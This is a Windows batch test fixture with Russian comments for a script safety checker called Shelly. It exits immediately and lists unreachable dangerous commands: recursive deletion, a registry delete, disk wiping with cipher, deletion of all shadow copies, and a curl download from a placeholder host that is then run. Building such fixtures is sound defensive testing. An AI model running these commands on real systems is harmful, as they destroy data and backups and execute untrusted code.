@echo off
:: Описание: Образец для проверки безопасности bat (опасные строки не выполняются)
:: Shelly-Icon: E7BA
::
:: Скрипт сразу выходит (exit /b 0 ниже), строки после метки :never никогда не выполняются,
:: и пути в них несуществующие. Они нужны только для статической проверки Shelly.
:: Ожидается: красный щит в строке, в подсказке находки (удаление, реестр, стирание, теневые копии,
:: загрузка и запуск) и пометка об упрощённой проверке bat-файлов; перед запуском окно «Опасно»;
:: в редакторе внизу замечания с номерами строк. Расписание с опасными находками не запускается.
echo Этот скрипт ничего не делает и сразу завершается.
exit /b 0

:never
del /s /q "%TEMP%\shelly-danger-demo-does-not-exist\*"
rd /s /q "%TEMP%\shelly-danger-demo-does-not-exist"
reg delete "HKCU\Software\ShellyDangerDemoDoesNotExist" /f
cipher /w:"%TEMP%\shelly-danger-demo-does-not-exist"
vssadmin delete shadows /all /quiet
curl -s -o "%TEMP%\shelly-demo.bat" https://example.invalid/shelly-demo.bat & call "%TEMP%\shelly-demo.bat"
